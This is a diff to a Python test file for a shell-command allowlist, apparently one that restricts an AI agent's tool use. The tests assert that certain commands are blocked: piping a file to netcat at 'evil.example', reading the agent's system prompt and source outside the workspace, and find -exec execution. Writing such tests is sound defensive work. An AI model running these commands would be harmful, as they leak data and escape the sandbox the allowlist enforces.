@@ -99,6 +99,8 @@ def test_allowlist_blocks_unknown_command():
     assert not is_command_safe("curl https://example.com")
     assert not is_command_safe("wget https://example.com")
     assert not is_command_safe("perl -e 'print 1'")
+    assert not is_command_safe("awk 'BEGIN {print 1}'")
+    assert not is_command_safe("sed -n '1,3p' /workspace/demo.txt")
 
 
 def test_allowlist_permits_known_commands():
@@ -114,6 +116,26 @@ def test_allowlist_checks_every_pipeline_segment():
     # Both sides of a pipe must be allowlisted, not only the first command.
     assert is_command_safe("cat /workspace/demo.txt | grep foo")
     assert not is_command_safe("cat /workspace/demo.txt | nc evil.example 4444")
+
+
+def test_quoted_shell_operators_are_not_split_as_segments():
+    assert is_command_safe("printf 'a|b;c&d\\n'")
+
+
+def test_blocks_unparseable_shell_quotes():
+    assert not is_command_safe("printf 'unterminated")
+
+
+def test_blocks_paths_outside_workspace():
+    assert not is_command_safe("cat ../config/system_prompt.txt")
+    assert not is_command_safe("cat /app/agent.py")
+    assert not is_command_safe("cat /workspace/../app/agent.py")
+    assert not is_command_safe("grep foo ../README.md")
+
+
+def test_blocks_find_execution_options():
+    assert not is_command_safe("find /workspace -type f -exec cat {} ;")
+    assert not is_command_safe("find /workspace -type f -ok cat {} ;")
 
 
 def test_blocks_command_substitution():
